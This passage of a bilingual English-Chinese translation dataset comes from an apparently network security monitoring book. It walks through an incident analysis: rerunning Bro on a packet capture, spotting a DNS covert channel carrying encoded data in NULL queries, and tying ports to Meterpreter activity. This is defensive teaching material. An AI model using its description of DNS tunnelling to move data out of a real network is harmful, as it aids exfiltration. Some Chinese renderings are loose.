  prefs: []
  type: TYPE_NORMAL
  zh: 在 NSM 平台上的 *sovm-eth2/dailylogs/2013-03-16* 目录中，我们找到了
- en: 163MB *snort.log.1363441680* file, which contains the full content data cap-
  id: totrans-722
  prefs: []
  type: TYPE_NORMAL
  zh: 163MB *snort.log.1363441680* 文件，包含完整的内容数据捕获。
- en: tured by Netsniff-ng on the SO NSM platform at the time of the incident.
  id: totrans-723
  prefs: []
  type: TYPE_NORMAL
  zh: 由 Netsniff-ng 捕获的在 SO NSM 平台上的数据，在事件发生时
- en: Because we have a copy of the original traffic on disk, we can run tools
  id: totrans-724
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们有原始流量的副本在磁盘上，所以我们可以运行工具
- en: like Bro against it. Netsniff-ng was able to save the full trace because it
    was
  id: totrans-725
  prefs: []
  type: TYPE_NORMAL
  zh: 类似于 Bro 的工具。Netsniff-ng 能够保存完整的跟踪数据，因为它
- en: just logging packets straight to disk; it wasn’t doing any inspection or analy-
  id: totrans-726
  prefs: []
  type: TYPE_NORMAL
  zh: 只是直接将数据包记录到磁盘；它并没有进行任何检查或分析—
- en: sis, as Bro tried to do. To determine what Bro might have missed, we can
  id: totrans-727
  prefs: []
  type: TYPE_NORMAL
  zh: sis，正如 Bro 尝试做的那样。为了确定 Bro 可能遗漏了什么，我们可以
- en: rerun Bro against the full content data stored on the sensor. The results are
  id: totrans-728
  prefs: []
  type: TYPE_NORMAL
  zh: 重新运行 Bro 以处理存储在传感器上的完整内容数据。结果显示在
- en: shown in Listing 11-2\.
  id: totrans-729
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-2 中。
- en: $ **bro -r snort.log.1363441680**
  id: totrans-730
  prefs: []
  type: TYPE_NORMAL
  zh: $ **bro -r snort.log.1363441680**
- en: $ **ls -al**
  id: totrans-731
  prefs: []
  type: TYPE_NORMAL
  zh: $ **ls -al**
- en: total 203008
  id: totrans-732
  prefs: []
  type: TYPE_NORMAL
  zh: 总计 203008
- en: drwxrwxr-x 3 sovm sovm 4096 Mar 16 15:54 .
  id: totrans-733
  prefs: []
  type: TYPE_NORMAL
  zh: drwxrwxr-x 3 sovm sovm 4096 Mar 16 15:54 .
- en: drwxr-xr-x 30 sovm sovm 4096 Mar 16 15:53 ..
  id: totrans-734
  prefs: []
  type: TYPE_NORMAL
  zh: drwxr-xr-x 30 sovm sovm 4096 Mar 16 15:53 ..
- en: -rw-rw-r-- 1 sovm sovm 59960 Mar 16 15:54 conn.log
  id: totrans-735
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 59960 Mar 16 15:54 conn.log
- en: -rw-rw-r-- 1 sovm sovm 44624347 Mar 16 15:54 dns.logu
  id: totrans-736
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 44624347 Mar 16 15:54 dns.logu
- en: -rw-rw-r-- 1 sovm sovm 1328 Mar 16 15:54 http.log
  id: totrans-737
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 1328 Mar 16 15:54 http.log
- en: -rw-rw-r-- 1 sovm sovm 1446 Mar 16 15:54 notice.log
  id: totrans-738
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 1446 Mar 16 15:54 notice.log
- en: -rw-rw-r-- 1 sovm sovm 1128 Mar 16 15:54 notice_policy.log
  id: totrans-739
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 1128 Mar 16 15:54 notice_policy.log
- en: -rw-rw-r-- 1 sovm sovm 251 Mar 16 15:54 packet_filter.log
  id: totrans-740
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 251 3月 16日 15:54 packet_filter.log
- en: -rw-r--r-- 1 sovm sovm 163155548 Mar 16 15:53 snort.log.1363441680
  id: totrans-741
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 sovm sovm 163155548 3月 16日 15:53 snort.log.1363441680
- en: -rw-rw-r-- 1 sovm sovm 1066 Mar 16 15:54 ssh.log
  id: totrans-742
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 1066 3月 16日 15:54 ssh.log
- en: drwx------ 3 sovm sovm 4096 Mar 16 15:54 .state
  id: totrans-743
  prefs: []
  type: TYPE_NORMAL
  zh: drwx------ 3 sovm sovm 4096 3月 16日 15:54 .state
- en: -rw-rw-r-- 1 sovm sovm 1668 Mar 16 15:54 weird.log
  id: totrans-744
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-rw-r-- 1 sovm sovm 1668 3月 16日 15:54 weird.log
- en: '*Listing 11-2: Running Bro manual y against full content data*'
  id: totrans-745
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-2：对完整内容数据运行 Bro 手动查询*'
- en: The large size of the *dns.log* file at u attracts our attention immediately.
  id: totrans-746
  prefs: []
  type: TYPE_NORMAL
  zh: '*dns.log* 文件的巨大大小立即引起了我们的注意。'
- en: How is there a 44MB DNS log for a 163MB packet trace?
  id: totrans-747
  prefs: []
  type: TYPE_NORMAL
  zh: 一个 163MB 的数据包跟踪怎么会有 44MB 的 DNS 日志？
- en: '**244** Chapter 11'
  id: totrans-748
  prefs: []
  type: TYPE_NORMAL
  zh: '**244** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-749
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**analyzing the bro dns.log file**'
  id: totrans-750
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析 bro dns.log 文件**'
- en: We decide to browse the new *dns.log* file manually to see what it reveals.
  id: totrans-751
  prefs: []
  type: TYPE_NORMAL
  zh: 我们决定手动浏览新的 *dns.log* 文件，看看它揭示了什么。
- en: '**N o T e :** *In early 2013, ELSA author Martin Holste added an* import.pl
    *script* (https://'
  id: totrans-752
  prefs: []
  type: TYPE_NORMAL
  zh: '**注：** *2013 年初，ELSA 作者 Martin Holste 添加了一个* import.pl *脚本* (https://'
- en: code.google.com/p/enterprise-log-search-and-archive/source/browse/
  id: totrans-753
  prefs: []
  type: TYPE_NORMAL
  zh: code.google.com/p/enterprise-log-search-and-archive/source/browse/
- en: trunk/elsa/node/import.pl/) *to ELSA to enable manual log additions. For this*
  id: totrans-754
  prefs: []
  type: TYPE_NORMAL
  zh: trunk/elsa/node/import.pl/) *到 ELSA 以启用手动日志添加功能。*
- en: '*example, however, we will combine the earlier ELSA query method with manual
    log*'
  id: totrans-755
  prefs: []
  type: TYPE_NORMAL
  zh: '*例如，我们将结合早期的 ELSA 查询方法与手动日志*'
- en: '*review, to demonstrate how analysts can use both techniques.*'
  id: totrans-756
  prefs: []
  type: TYPE_NORMAL
  zh: '*回顾，展示分析师如何结合使用这两种技术。*'
- en: We see many normal entries, and then a few that look odd. Listing 11-3
  id: totrans-757
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到许多正常条目，然后有一些看起来很奇怪的条目。清单 11-3
- en: shows a few sample DNS log entries.
  id: totrans-758
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了几个示例 DNS 日志条目。
- en: 1363444304.701350 fOBMXgho3v5 10.0.0.99 40912 198.51.100.3 53 udp 10453 daisy.ubuntu.comu
    1 C_INTERNET 1 Ay 0 NOERROR F
  id: totrans-759
  prefs: []
  type: TYPE_NORMAL
  zh: 1363444304.701350 fOBMXgho3v5 10.0.0.99 40912 198.51.100.3 53 udp 10453 daisy.ubuntu.comu
    1 C_INTERNET 1 Ay 0 NOERROR F
- en: F T T 0 91.189.95.54,91.189.95.55{ 5.000000,5.000000
  id: totrans-760
  prefs: []
  type: TYPE_NORMAL
  zh: F T T 0 91.189.95.54,91.189.95.55{ 5.000000,5.000000
- en: 1363444390.148462 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 470 labhl2pekjmnzoaoteostk4ms4xfhzma.practicalnsm.comv
    1 C_INTERNET 10
  id: totrans-761
  prefs: []
  type: TYPE_NORMAL
  zh: 1363444390.148462 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 470 labhl2pekjmnzoaoteostk4ms4xfhzma.practicalnsm.comv
    1 C_INTERNET 10
- en: NULLz - - F F T
  id: totrans-762
  prefs: []
  type: TYPE_NORMAL
  zh: NULLz - - F F T
- en: F 0 - -
  id: totrans-763
  prefs: []
  type: TYPE_NORMAL
  zh: F 0 - -
- en: 1363444390.147170 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 58279 vaaaakat2v2.practicalnsm.comw
    1 C_INTERNET 10 NULLz - -
  id: totrans-764
  prefs: []
  type: TYPE_NORMAL
  zh: 1363444390.147170 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 58279 vaaaakat2v2.practicalnsm.comw
    1 C_INTERNET 10 NULLz - -
- en: F F T F 0 -
  id: totrans-765
  prefs: []
  type: TYPE_NORMAL
  zh: F F T F 0 -
- en: '-'
  id: totrans-766
  prefs: []
  type: TYPE_NORMAL
  zh: '-'
- en: 1363444390.092180 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 50552 yrb5fo.practicalnsm.comx
    1 C_INTERNET 10 NULLz - - F
  id: totrans-767
  prefs: []
  type: TYPE_NORMAL
  zh: 1363444390.092180 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 50552 yrb5fo.practicalnsm.comx
    1 C_INTERNET 10 NULLz - - F
- en: F T F 0 - -
  id: totrans-768
  prefs: []
  type: TYPE_NORMAL
  zh: F T F 0 - -
- en: '*Listing 11-3: Normal and suspicious entries in the Bro* dns .log *file*'
  id: totrans-769
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-3：Bro dns.log 文件中的正常和可疑条目*'
- en: The first record for *daisy.ubuntu.com* u looks like a regular DNS query;
  id: totrans-770
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个记录是 *daisy.ubuntu.com* u，看起来像是一个常规的 DNS 查询；
- en: someone wants to know the IP address for this site. But the second two records
  id: totrans-771
  prefs: []
  type: TYPE_NORMAL
  zh: 有人想知道该网站的 IP 地址。但是接下来的两条记录
- en: look odd. Why is someone querying for *labhl2pekjmnzoaoteostk4ms4xfhzma*
  id: totrans-772
  prefs: []
  type: TYPE_NORMAL
  zh: '看起来很奇怪。为什么有人查询 *labhl2pekjmnzoaoteostk4ms4xfhzma* '
- en: '*.practicalnsm.com* v, *vaaaakat2v2.practicalnsm.com* w, and *yrb5fo.practicalnsm*'
  id: totrans-773
  prefs: []
  type: TYPE_NORMAL
  zh: '*.practicalnsm.com* v，*vaaaakat2v2.practicalnsm.com* w，以及 *yrb5fo.practicalnsm* '
- en: '*.com* x? Also, unlike the first query for an A record y, these are NULL que-'
  id: totrans-774
  prefs: []
  type: TYPE_NORMAL
  zh: '*.com* x？此外，与第一次查询 A 记录 y 不同，这些是 NULL 查询-'
- en: ries z, which serve no practical purpose. A query for an A record returns
  id: totrans-775
  prefs: []
  type: TYPE_NORMAL
  zh: 查询 z，是没有实际意义的 A 记录查询。A 记录查询返回
- en: the IP address associated with a domain name. Bro logs the response to the
  id: totrans-776
  prefs: []
  type: TYPE_NORMAL
  zh: 与域名相关的 IP 地址。Bro 记录了对
- en: A record query in the single DNS log {.
  id: totrans-777
  prefs: []
  type: TYPE_NORMAL
  zh: 单个 DNS 日志中的 A 记录查询 {。
- en: 'Also note the source and destination IP addresses for these queries:'
  id: totrans-778
  prefs: []
  type: TYPE_NORMAL
  zh: 还请注意这些查询的源 IP 和目标 IP 地址：
- en: 10.0.0.99 | and 203.0.113.8 }. The source IP address 10.0.0.99 was the sys-
  id: totrans-779
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99 | 和 203.0.113.8 }。源 IP 地址 10.0.0.99 是系统-
- en: tem to which 172.16.0.37 connected three times via SSH. The destination IP
  id: totrans-780
  prefs: []
  type: TYPE_NORMAL
  zh: 系统通过 SSH 与 172.16.0.37 连接了三次。目标 IP 地址
- en: address shares the same net block as 203.0.113.15, the computer hosting a
  id: totrans-781
  prefs: []
  type: TYPE_NORMAL
  zh: 地址与 203.0.113.15 相同的网络块，共享了一个主机计算机
- en: malicious Java payload. Something odd is happening here. Then we notice
  id: totrans-782
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意 Java 有效载荷。这里发生了一些奇怪的事情。然后我们注意到
- en: other weird entries that also involve 10.0.0.99 and 203.0.113.8, as shown in
  id: totrans-783
  prefs: []
  type: TYPE_NORMAL
  zh: 其他也涉及 10.0.0.99 和 203.0.113.8 的奇怪条目，如下所示
- en: Listing 11-4\. These are NULL DNS records as well u.
  id: totrans-784
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 11-4。这些也是 NULL DNS 记录。
- en: Client-side Compromise **245**
  id: totrans-785
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端侧妥协 **245**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-786
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 1363445036.498672 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 49394 0euase6eq\xc5v\xc1\xbfp2\xc5h\xdd\xd0kmv\xedt\xc2\xc7\xf8\xea2p\xdc\xe0\xcd\xef\xfd\
    xc5t\xed8t\xc4yj\xd1\xdf9qn\xf8\xcf0\xd8\xd480\xe7\xc5\xda\xf97\xe5k.\xebb6\xd3gj\xc76\xdb\xe9\
    xdbn\xce\xf1lv\xeb\xbdo\xdayn5gko\xc3tny9\xbf\xe5\xee\xce\xd3\xfb\xee\xc2bd\xd9zj\xbe\xe2z\
    xf37\xbe\xcf\xbeh\xfd\xea\xfbe.\xecch\xd4k\xc2cgjqq\xf2\xe5\xd1mj\xcck6mg\xf5z\xc5\xe7sc\xeb\
    xea\xfbsc\xe4\xeb\xf9\xe7xq\xd57\xd9t\xe3\xe3\xef\xc0m\xd7fh\xeav\xcc8dgs.r\xfd\xe9\xf8\xca\
    xd3\xe9\xc4\xd4u\xect8z\xcc\xf2w\xecyy\xc3\xf7n5bq\xf9\xe1v\xc1e\xcdo\xc8z\xf53\xcecgpwy\xd7\
    xfdr\xe5\xfae9iy\xe9\xebz7.practicalnsm.com 1
  id: totrans-787
  prefs: []
  type: TYPE_NORMAL
  zh: 1363445036.498672 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 49394 0euase6eq\xc5v\xc1\xbfp2\xc5h\xdd\xd0kmv\xedt\xc2\xc7\xf8\xea2p\xdc\xe0\xcd\xef\xfd\
    xc5t\xed8t\xc4yj\xd1\xdf9qn\xf8\xcf0\xd8\xd480\xe7\xc5\xda\xf97\xe5k.\xebb6\xd3gj\xc76\xdb\xe9\
    xdbn\xce\xf1lv\xeb\xbdo\xdayn5gko\xc3tny9\xbf\xe5\xee\xce\xd3\xfb\xee\xc2bd\xd9zj\xbe\xe2z\
    xf37\xbe\xcf\xbeh\xfd\xea\xfbe.\xecch\xd4k\xc2cgjqq\xf2\xe5\xd1mj\xcck6mg\xf5z\xc5\xe7sc\xeb\
    xea\xfbsc\xe4\xeb\xf9\xe7xq\xd57\xd9t\xe3\xe3\xef\xc0m\xd7fh\xeav\xcc8dgs.r\xfd\xe9\xf8\xca\
    xd3\xe9\xc4\xd4u\xect8z\xcc\xf2w\xecyy\xc3\xf7n5bq\xf9\xe1v\xc1e\xcdo\xc8z\xf53\xcecgpwy\xd7\
    xfdr\xe5\xfae9iy\xe9\xebz7.practicalnsm.com 1
- en: C_INTERNET 10 NULLu - - F F T F 0
  id: totrans-788
  prefs: []
  type: TYPE_NORMAL
  zh: C_INTERNET 10 NULLu - - F F T F 0
- en: '- -'
  id: totrans-789
  prefs: []
  type: TYPE_NORMAL
  zh: '- -'
- en: 1363444959.826628 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 53252 0iiafy\xf7\xdf\xdbw\xfa\xe3\xe1w\xe7u5\xd5auz\xbf\xe3\xd6\xe6\xd0\xf4u\xc0a\xe4\
    xc3l\xdf\xe6\xe1\xf6\xe1\xe1\xbf\xf62c\xd6\xe6d\xe8\xcf\xe2m\xc4\xe3\xe8\xeeru\xe68\xcd\
    xc8\xf4j.\xea\xf9ujb\xdau\xc0\xda\xf3\xef\xeb\xc5\xf9\xc4p\xbe\xee\xf6\xc1awd\xfc\xf2\xc5\
    xd0\xfd\xf1\xc0f\xc5r\xe0\xc9\xecm\xdd\xd2\xe2l\xf0\xd8\xfc\xd8ct5\xc6\xfdt\xcce\xec\xf7z\
    xea.z\xe5m\xfbr\xe9\xbe\xd2\xe7\xfd\xe3\xc6cu\xc2wtz\xeb\xe1uqk\xbf\xf2\xcb4\xe6v1w\xcei\xd8\
    xca\xc8hmsg4qjzhkd\xe0u\xe4\xfa\xc7nitlk.\xbc\xeb\xdec\xe1\xc8l31yiz\xfd\xd1\xf8\xfdro\xd0\
    xef3p\xccoql\xd9\xdb\xc5\xedt\xc2\xc1\xd5\xf2m\xfcq\xebm\xc2\xc8f\xf9x\xf8xikc\xc3wu\xdfcc.
  id: totrans-790
  prefs: []
  type: TYPE_NORMAL
  zh: 1363444959.826628 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 53252 0iiafy\xf7\xdf\xdbw\xfa\xe3\xe1w\xe7u5\xd5auz\xbf\xe3\xd6\xe6\xd0\xf4u\xc0a\xe4\
    xc3l\xdf\xe6\xe1\xf6\xe1\xe1\xbf\xf62c\xd6\xe6d\xe8\xcf\xe2m\xc4\xe3\xe8\xeeru\xe68\xcd\
    xc8\xf4j.\xea\xf9ujb\xdau\xc0\xda\xf3\xef\xeb\xc5\xf9\xc4p\xbe\xee\xf6\xc1awd\xfc\xf2\xc5\
    xd0\xfd\xf1\xc0f\xc5r\xe0\xc9\xecm\xdd\xd2\xe2l\xf0\xd8\xfc\xd8ct5\xc6\xfdt\xcce\xec\xf7z\
    xea.z\xe5m\xfbr\xe9\xbe\xd2\xe7\xfd\xe3\xc6cu\xc2wtz\xeb\xe1uqk\xbf\xf2\xcb4\xe6v1w\xcei\xd8\
    xca\xc8hmsg4qjzhkd\xe0u\xe4\xfa\xc7nitlk.\xbc\xeb\xdec\xe1\xc8l31yiz\xfd\xd1\xf8\xfdro\xd0\
    xef3p\xccoql\xd9\xdb\xc5\xedt\xc2\xc1\xd5\xf2m\xfcq\xebm\xc2\xc8f\xf9x\xf8xikc\xc3wu\xdfcc.
- en: practicalnsm.com 1 C_INTERNET 10 NULLu - - F F T
  id: totrans-791
  prefs: []
  type: TYPE_NORMAL
  zh: practicalnsm.com 1 C_INTERNET 10 NULLu - - F F T
- en: F 0 - -
  id: totrans-792
  prefs: []
  type: TYPE_NORMAL
  zh: F 0 - -
- en: 1363445003.696798 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 45003 0akazvdidx3\xf1bv\xf078w\xe20\xfd\xd0i\xc1\xe7d\xe2\xc5\xcd\xe3\xda7\xe0\xf9\xbf9\
    xfdk\xefrxcn\xd5\xebue\xc6\xed\xbc\xc5b\xe2\xcc\xda\xd0\xc3\xe2\xbdij8.\xdf\xf3\xfa\xefy\xfd\
    xc8yhm\xbe\xf77l\xc8\xdc\xe3\xe0\xca\xdeo\xc0\xf3\xcbam\xd1\xd2\xfdt\xd1i\xd7r\xea\xcbc3\xdc\
    xee\xe5\xe04o\xd9\xce\xec8n\xf99w\xd8\xfcjnw.\xf2j\xe4\xf5\xf6\xeb\xc60\xf3hv\xf9\xc38s\xef\
    xd5b\xe4\xc6\xc9\xc9g\xd38\xfbhy\xf5\xccxw\xc7\xd0a2ypsz\xca\xe3\xbd\xc8\xbd\xc6cy\xd2\xce\
    xbf\xe0b\xd8\xc4\xc6i.cb1\xf4fqp\xce\xd4\xebb\xe9v\xfdk\xed\xc3\xce\xcf\xe5j\xf9u\xf4uyn\
    xed\xe3o\xf6l\xd7zyrp\xf2\xfd5swrz\xe8\xe6\xd5\xe2\xd3iv\xf2m\xd2\xe9\xdb.practicalnsm.com
    1 C_INTERNET 10 NULLu - - F F T F 0
  id: totrans-793
  prefs: []
  type: TYPE_NORMAL
  zh: 1363445003.696798 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 45003 0akazvdidx3\xf1bv\xf078w\xe20\xfd\xd0i\xc1\xe7d\xe2\xc5\xcd\xe3\xda7\xe0\xf9\xbf9\
    xfdk\xefrxcn\xd5\xebue\xc6\xed\xbc\xc5b\xe2\xcc\xda\xd0\xc3\xe2\xbdij8.\xdf\xf3\xfa\xefy\xfd\
    xc8yhm\xbe\xf77l\xc8\xdc\xe3\xe0\xca\xdeo\xc0\xf3\xcbam\xd1\xd2\xfdt\xd1i\xd7r\xea\xcbc3\xdc\
    xee\xe5\xe04o\xd9\xce\xec8n\xf99w\xd8\xfcjnw.\xf2j\xe4\xf5\xf6\xeb\xc60\xf3hv\xf9\xc38s\xef\
    xd5b\xe4\xc6\xc9\xc9g\xd38\xfbhy\xf5\xccxw\xc7\xd0a2ypsz\xca\xe3\xbd\xc8\xbd\xc6cy\xd2\xce\
    xbf\xe0b\xd8\xc4\xc6i.cb1\xf4fqp\xce\xd4\xebb\xe9v\xfdk\xed\xc3\xce\xcf\xe5j\xf9u\xf4uyn\
    xed\xe3o\xf6l\xd7zyrp\xf2\xfd5swrz\xe8\xe6\xd5\xe2\xd3iv\xf2m\xd2\xe9\xdb.practicalnsm.com
    1 C_INTERNET 10 NULLu - - F F T F 0
- en: '- -'
  id: totrans-794
  prefs: []
  type: TYPE_NORMAL
  zh: '- -'
- en: '*Listing 11-4: Malicious entries in the Bro* dns .log *file*'
  id: totrans-795
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-4：Bro* dns .log *文件中的恶意条目*'
- en: It looks as if someone is transporting data within hostnames in the
  id: totrans-796
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来像是某人在主机名中传输数据。
- en: '*practicalnsm.com* domain. This appears to be a form of covert channel—an'
  id: totrans-797
  prefs: []
  type: TYPE_NORMAL
  zh: '*practicalnsm.com* 域名。这看起来是一种隐蔽通道的形式——'
- en: intruder is sending content via DNS records.
  id: totrans-798
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者通过 DNS 记录发送内容。
- en: The technique we’re observing is popular when defenders keep tight
  id: totrans-799
  prefs: []
  type: TYPE_NORMAL
  zh: 我们观察到的技术在防御者严格
- en: access controls on outbound traffic. If an attacker can query name servers,
  id: totrans-800
  prefs: []
  type: TYPE_NORMAL
  zh: 出站流量的访问控制。如果攻击者可以查询域名服务器，
- en: he can send data packaged as part of the hostnames he queries via DNS.
  id: totrans-801
  prefs: []
  type: TYPE_NORMAL
  zh: 他可以通过 DNS 查询时将数据打包在主机名中发送。
- en: (This is a low-bandwidth attack method because a limited number of bytes
  id: totrans-802
  prefs: []
  type: TYPE_NORMAL
  zh: （这是一种低带宽攻击方法，因为它只使用有限的字节数
- en: can be carried in a hostname. In fact, more than 65,000 DNS records in
  id: totrans-803
  prefs: []
  type: TYPE_NORMAL
  zh: 可以通过主机名传输数据。事实上，超过 65,000 条 DNS 记录
- en: this particular Bro *dns.log* file are associated with this sort of activity.)
  id: totrans-804
  prefs: []
  type: TYPE_NORMAL
  zh: 这个特定的 Bro *dns.log* 文件与这种活动类型相关联。)
- en: '**checking destination Ports**'
  id: totrans-805
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查目标端口**'
- en: So far, we’ve recognized that four IP addresses are involved in this particular
  id: totrans-806
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已识别出在这个特定事件中涉及的四个IP地址。
- en: 'intrusion. Two belong to Vivian’s Pets: 172.16.0.37 (in the wireless network),'
  id: totrans-807
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵。两者属于Vivian’s Pets：172.16.0.37（位于无线网络中），
- en: and 10.0.0.99 (in the internal network). Two belong to the intruder and sit
  id: totrans-808
  prefs: []
  type: TYPE_NORMAL
  zh: 和 10.0.0.99（位于内部网络中）。其中两个属于入侵者，并位于
- en: 'on the Internet: 203.0.113.15 and 203.0.113.8\. Figure 11-11 shows the posi-'
  id: totrans-809
  prefs: []
  type: TYPE_NORMAL
  zh: 在互联网上：203.0.113.15 和 203.0.113.8。图11-11显示了这些IP地址的位置。
- en: tions of these IP addresses on the network.
  id: totrans-810
  prefs: []
  type: TYPE_NORMAL
  zh: 这些IP地址在网络上的位置。
- en: '**246** Chapter 11'
  id: totrans-811
  prefs: []
  type: TYPE_NORMAL
  zh: '**246** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-812
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 140](index-281_1.png)'
  id: totrans-813
  prefs: []
  type: TYPE_IMG
  zh: '![Image 140](index-281_1.png)'
- en: Intruder 1
  id: totrans-814
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Internet
  id: totrans-815
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网
- en: 203.0.113.15
  id: totrans-816
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15
- en: Intruder 2
  id: totrans-817
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 2
- en: 203.0.113.8
  id: totrans-818
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.8
- en: Tap
  id: totrans-819
  prefs: []
  type: TYPE_NORMAL
  zh: Tap
- en: Wireless
  id: totrans-820
  prefs: []
  type: TYPE_NORMAL
  zh: 无线
- en: Network
  id: totrans-821
  prefs: []
  type: TYPE_NORMAL
  zh: 网络
- en: Tap
  id: totrans-822
  prefs: []
  type: TYPE_NORMAL
  zh: Tap
- en: NSM
  id: totrans-823
  prefs: []
  type: TYPE_NORMAL
  zh: NSM
- en: Laptop
  id: totrans-824
  prefs: []
  type: TYPE_NORMAL
  zh: 笔记本电脑
- en: Internal
  id: totrans-825
  prefs: []
  type: TYPE_NORMAL
  zh: 内部网络
- en: 172.16.0.37
  id: totrans-826
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: Network
  id: totrans-827
  prefs: []
  type: TYPE_NORMAL
  zh: 网络
- en: Desktop
  id: totrans-828
  prefs: []
  type: TYPE_NORMAL
  zh: 桌面
- en: 10.0.0.99
  id: totrans-829
  prefs: []
  type: TYPE_NORMAL
  zh: 10.0.0.99
- en: '*Figure 11-11: Participants in the intrusion*'
  id: totrans-830
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-11：入侵的参与者*'
- en: We decide to take another look at traffic involving 203.0.113.115, this
  id: totrans-831
  prefs: []
  type: TYPE_NORMAL
  zh: 我们决定再次查看涉及203.0.113.115的流量，
- en: time by querying ELSA for records and group by dstport (destination port).
  id: totrans-832
  prefs: []
  type: TYPE_NORMAL
  zh: 通过查询ELSA的记录并按目标端口（dstport）进行分组。
- en: The results are shown in Figure 11-12\.
  id: totrans-833
  prefs: []
  type: TYPE_NORMAL
  zh: 结果如图11-12所示。
- en: '*Figure 11-12: ELSA displays a summary*'
  id: totrans-834
  prefs: []
  type: TYPE_NORMAL
  zh: '*图11-12：ELSA显示的汇总*'
- en: '*of dstport entries for 203.0.113.15\.*'
  id: totrans-835
  prefs: []
  type: TYPE_NORMAL
  zh: '*203.0.113.15的目标端口条目。*'
- en: Client-side Compromise **247**
  id: totrans-836
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端端点妥协 **247**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-837
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 141](index-282_1.png)'
  id: totrans-838
  prefs: []
  type: TYPE_IMG
  zh: '![Image 141](index-282_1.png)'
- en: '![Image 142](index-282_2.png)'
  id: totrans-839
  prefs: []
  type: TYPE_IMG
  zh: '![Image 142](index-282_2.png)'
- en: Records with 54056 as the destination port are associated with the
  id: totrans-840
  prefs: []
  type: TYPE_NORMAL
  zh: 目标端口为54056的记录与
- en: Metasploit Meterpreter activity noted earlier. There is only one type of mes-
  id: totrans-841
  prefs: []
  type: TYPE_NORMAL
  zh: 只有一种类型的消息与此活动相关。
- en: sage for this activity; they are all Snort alerts, as shown in Figure 11-13\.
  id: totrans-842
  prefs: []
  type: TYPE_NORMAL
  zh: 这些活动的消息；它们都是Snort警报，如图11-13所示。
- en: '*Figure 11-13: ELSA displays a summary of Snort signatures for*'
  id: totrans-843
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-13：ELSA显示了Snort签名的汇总*'
- en: '*203.0.113.15 and dstport 54056\.*'
  id: totrans-844
  prefs: []
  type: TYPE_NORMAL
  zh: '*203.0.113.15 和目标端口 54056。*'
- en: Turning to destination port 4444, we use a similar process with similar
  id: totrans-845
  prefs: []
  type: TYPE_NORMAL
  zh: 转到目标端口4444，我们使用类似的过程进行分析。
- en: results. Figure 11-14 shows what ELSA returns when we examine records
  id: totrans-846
  prefs: []
  type: TYPE_NORMAL
  zh: 结果。图11-14显示了当我们检查记录时ELSA返回的结果。
- en: where port 4444 is the destination port and 203.0.113.15 is an IP address.
  id: totrans-847
  prefs: []
  type: TYPE_NORMAL
  zh: 其中端口4444是目标端口，203.0.113.15是一个IP地址。
- en: '*Figure 11-14: ELSA displays a summary of Snort signatures for*'
  id: totrans-848
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-14：ELSA显示了Snort签名的汇总*'
- en: '*203.0.113.15 and dstport 4444\.*'
  id: totrans-849
